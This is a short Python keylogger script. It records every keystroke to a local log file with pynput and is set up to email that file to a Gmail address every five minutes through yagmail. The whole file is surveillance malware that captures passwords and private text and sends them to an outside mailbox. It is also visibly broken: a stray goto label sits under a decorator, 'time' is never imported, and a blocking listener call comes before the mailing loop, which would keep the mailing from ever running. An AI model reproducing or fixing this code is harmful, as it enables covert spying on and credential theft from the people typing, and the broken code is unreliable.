from pynput.keyboard import Listener
import yagmail
import schedule
from goto import with_goto

@with_goto
label .log
def anonymous(key):
	key = str(key)
	key = key.replace("'","")
	if key == "Key.esc":
		raise SystemExit(0)
	if key == "Key.ctrl_l":
		key = ""
	if key == "Key.alt_l":
		key = ""
	if key == "Key.ctrl_r":
		key = ""
	if key == "Key.alt_r":
		key = ""
	if key == "Key.enter":
		key = "\n"

	with open("log.txt", "a") as file:
		file.write(key)
	print(key)

with Listener(on_press=anonymous) as logger:
	logger.join()

def func():
	receiver = "receiver@gmail.com"
	body = ""
	filename = "log.txt"

	yag = yagmail.SMTP("sender@gmail.com")
	yag.send(
		to=receiver,
		subject="",
		contents=body, 
		attachments=filename,
	)

schedule.every(5).minutes.do(func)

while True:
	schedule.run_pending()
	time.sleep(1)

goto .log

